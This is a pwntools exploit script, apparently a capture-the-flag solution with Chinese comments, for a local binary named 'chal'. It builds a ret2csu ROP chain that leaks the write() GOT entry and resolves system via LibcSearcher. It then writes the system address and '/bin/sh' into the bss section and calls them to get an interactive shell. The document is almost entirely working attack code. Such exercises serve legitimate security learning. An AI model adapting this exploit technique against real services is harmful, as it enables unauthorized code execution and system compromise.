from pwn import*
from LibcSearcher import*
context(arch='amd64', os='linux', log_level='debug')
p   = process('./chal')
elf = ELF('./chal')

write_got = elf.got['write']
gets_got  = elf.got['gets']
vuln      = elf.symbols['vuln']
data      = 0x404040 # 写入execve和/bin/sh的地址

gadget1   = 0x401326
gadget2   = 0x401310

# 利用csu函数片段执行任意函数
# 64位参数使用的寄存器依次为 : rdi, rsi, rdx, rcx, r8, r9
def csu(rdi, rsi, rdx, fun, ret):
    payload  = b'a' + b'\0' * (0x10 - 1 + 8)
    # rdi rsi rdx
    payload += p64(gadget1)
    payload += p64(0) # add rsp, 8
    payload += p64(0) # rbx = 0
    payload += p64(1) # rbp = 1
    payload += p64(rdi) # r12 = edi = rdi(注意rdi只有后四个字节有效)
    payload += p64(rsi) # r13 = rsi
    payload += p64(rdx) # r14 = rdx
    payload += p64(fun) # r15 = fun
    payload += p64(gadget2) # 
    payload += b'\0' * (7 * 8) # add rsp, 8和填充6个pop
    payload += p64(ret)
    p.sendline(payload)

p.recvuntil('backdoor!')
csu(1, write_got, 8, write_got, vuln) # 获取got中的write地址

write = u64(p.recv()[:8])
libc     = LibcSearcher('write', write)
libcBase = write    - libc.dump('write')
execve   = libcBase + libc.dump('system')

# 在bss段写入execve的地址和/bin/sh
# 因为csu中调用函数使用的值是指针的值, 因此需要一个指向execve的指针
# 因为rdi修改的是edi的值, 因此不能使用libc中的/bin/sh, 只能将/bin/sh写入较低地址的bss段
csu(data, 0, 0, gets_got, vuln)
p.sendline(p64(execve) + b'/bin/sh' + b'\0')

# 执行execve调用/bin/sh
p.recvuntil('backdoor!')
csu(data + 8, 0, 0, data, vuln)

p.interactive()
